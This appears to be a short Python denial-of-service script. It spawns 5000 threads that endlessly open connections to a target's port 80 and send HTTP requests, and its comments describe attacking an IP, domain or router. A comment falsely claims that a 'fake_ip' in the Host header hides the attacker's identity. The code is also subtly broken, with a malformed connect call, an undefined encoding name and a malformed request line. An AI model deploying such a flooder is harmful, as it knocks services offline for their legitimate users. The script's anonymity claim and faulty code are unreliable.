import threading
import socket

# This could be an IP adress or Domain name or Router
target = ''

# This is dectated by the service we want to attack now -> HTTP
port = 80

# This is important to hide identity, could be random IP
fake_ip = ''


# This method connets to target, sends packets and closes connection in loop
def attack():
    while True:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.connect(target, port)
        soc.sendto(("GET /" + target + "HTTP/1.1\r\n").encode(ascii), (target, port))
        soc.sendto(("HOST:" + fake_ip + "\r\n\r\n").encode(ascii), (target, port))
        soc.close()

# Does multiple threads at the same time
for i in range(5000):
    thread = threading.Thread(target = attack)
    thread.start()
